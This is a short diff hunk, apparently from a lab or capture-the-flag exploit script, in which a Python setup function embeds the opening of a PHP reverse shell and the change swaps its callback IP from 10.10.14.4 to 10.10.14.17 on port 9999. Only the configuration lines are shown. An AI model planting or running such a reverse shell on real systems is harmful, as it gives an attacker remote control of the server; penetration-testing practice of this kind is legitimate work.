@@ -14,7 +14,7 @@ def setup(host, port):
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.14.4';  // CHANGE THIS
+$ip = '10.10.14.17';  // CHANGE THIS
 $port = 9999;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
